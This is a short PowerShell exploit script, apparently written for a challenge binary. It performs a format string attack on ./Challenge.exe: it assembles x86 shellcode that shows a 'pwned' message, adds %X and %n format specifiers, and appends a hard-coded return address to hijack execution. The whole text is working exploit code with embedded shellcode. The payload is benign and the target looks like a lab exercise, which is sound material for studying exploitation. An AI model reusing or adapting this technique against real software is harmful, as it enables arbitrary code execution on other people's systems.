<#
 # Author: @OsandaMalith
 # Website: https://osandamalith.com
 # Format String Exploitation
 #>
  
$shellcode = [Byte[]] @(
  0x33, 0xc0, 0x50, 
  0x68, 0x6c, 0x61, 0x6e, 0x21,
  0x68, 0x43, 0x6f, 0x72, 0x65, 
  0x8b, 0xdc,
  0x50,  
  0x68, 0x61, 0x6e, 0x21, 0x21,
  0x68, 0x6f, 0x72, 0x65, 0x6c, 
  0x68, 0x62, 0x79, 0x21, 0x43,
  0x68, 0x6e, 0x65, 0x64, 0x21, 
  0x68, 0x6e, 0x21, 0x70, 0x77,
  0x68, 0x21, 0x62, 0x65, 0x65,
  0x68, 0x68, 0x61, 0x76, 0x65, 
  0x68, 0x59, 0x6f, 0x75, 0x21,
  0x8b, 0xcc,
  0x33, 0xc0,
  0x50,
  0x53,
  0x51,
  0x50,
  0x68,
  0x41, 0x41, 0x41, 0x41,
  0xc7, 0xc6, 0x60, 0x06, 0x10, 0x75,
  0xff, 0xe6
)
 
$shellcode += [Byte[]] (0x41) * (198 - $shellcode.Length)
 
$fmt = ([system.Text.Encoding]::ASCII).GetBytes('%X' * 120)      + 
       ([system.Text.Encoding]::ASCII).GetBytes('%.999999x')     + 
       ([system.Text.Encoding]::ASCII).GetBytes('%.299999x')     +
       ([system.Text.Encoding]::ASCII).GetBytes('%.399999x')     +
       ([system.Text.Encoding]::ASCII).GetBytes('%.549x')        +
       ([system.Text.Encoding]::ASCII).GetBytes('%n')            +
       ([system.Text.Encoding]::ASCII).GetBytes('E' * 23)
 
$ret = [System.BitConverter]::GetBytes(0x0019f720)
 
$final = $shellcode + $fmt + $ret
 
$payload = ''
 
ForEach ($i in $final) { 
     $payload += ([system.Text.Encoding]::Default).GetChars($i)
}
 
Start-Process ./Challenge.exe -ArgumentList $payload